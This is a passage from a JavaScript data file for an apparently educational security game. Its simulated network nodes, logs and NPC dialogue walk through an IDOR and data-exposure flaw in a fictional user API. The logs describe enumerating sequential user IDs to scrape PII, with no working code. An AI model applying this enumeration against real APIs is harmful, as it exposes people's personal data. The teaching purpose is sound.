❌ Missing: Users can access any user's data
❌ Missing: No validation of user_id ownership

Field-Level Authorization:
❌ Missing: No filtering of sensitive fields
❌ Missing: No role-based field access

Recommendation: Implement object-level AND field-level authorization`,
    clue: "idor_vulnerability",
    vulnerability: "broken_object_authorization",
    npc: {
      name: "🔐 Security Architect",
      dialog: "We have authentication but weak authorization. Users can access objects they don't own (IDOR) and see fields they shouldn't (excessive data exposure). We need both object-level and field-level access controls.",
    },
  },
  {
    id: "api-docs",
    name: "API Documentation",
    hostname: "docs-api.techcorp.local",
    type: "documentation",
    description: "Swagger/OpenAPI docs",
    status: "unexamined",
    scanResult: "Swagger UI exposing API structure.",
    logs: `API Documentation:
GET /api/users/{id}
  - Authentication: Required
  - Authorization: NONE ⚠️
  - Rate Limit: NONE ⚠️
  - Returns: Full user object (all fields)

Security Issues Documented:
1. No rate limiting (allows enumeration)
2. No authorization check (IDOR vulnerability)
3. Excessive data exposure (sensitive fields)
4. Predictable IDs (sequential integers)

Attack Scenarios:
- Attacker can enumerate all users (1-10000)
- Access any user's full profile
- Extract PII, SSN, salary data
- No rate limiting prevents detection`,
    npc: {
      name: "📚 Technical Writer",
      dialog: "I just document what the API does. Looking at it now, it does seem like the API is pretty... open? Anyone logged in can query any user and see everything about them?",
    },
  },
  {
    id: "monitoring",
    name: "API Monitoring",
    hostname: "monitor-api.techcorp.local",
    type: "monitoring",
    description: "DataDog APM and monitoring",
    status: "unexamined",
    scanResult: "Application performance monitoring.",
    logs: `Anomaly Detection:
[CRITICAL] User enumeration detected
  - Source: 192.168.1.100
  - Pattern: Sequential user ID requests (1-10000)
  - Rate: 167 requests/second
  - Duration: 60 seconds
  - Data extracted: 10,000 user profiles with PII

[CRITICAL] Data exfiltration detected
  - Volume: 450 MB of user data
  - Contains: SSN, salary, addresses, phone numbers
  - No rate limiting to prevent attack
  - No authorization checks on user endpoints

Impact Assessment:
  - All user PII compromised
  - Regulatory violation (GDPR, CCPA)
  - Potential fines: $millions
  - Reputation damage: Severe

Root Causes:
  1. Missing rate limiting
  2. Broken object-level authorization (IDOR)
  3. Excessive data exposure
  4. No field-level permissions`,
    npc: {
      name: "📊 SRE Team",
      dialog: "Our monitoring caught a massive data scraping attack. Someone enumerated all 10,000 users and downloaded their full profiles including SSNs and salaries. The API has zero protection against this. We need rate limiting and proper authorization ASAP!",
    },
  },
];

export function getNetworkForLevel(levelId) {
  switch (levelId) {
    case 1:
      return LEVEL_1_NETWORK;
    case 2:
      return LEVEL_2_NETWORK;
    case 3:
      return LEVEL_3_NETWORK;
    case 4:
      return LEVEL_4_NETWORK;
    case 5:
      return LEVEL_5_NETWORK;
    case 6:
      return LEVEL_6_NETWORK;
    case 7:
      return LEVEL_7_NETWORK;
    default:
      return LEVEL_1_NETWORK;
  }
}
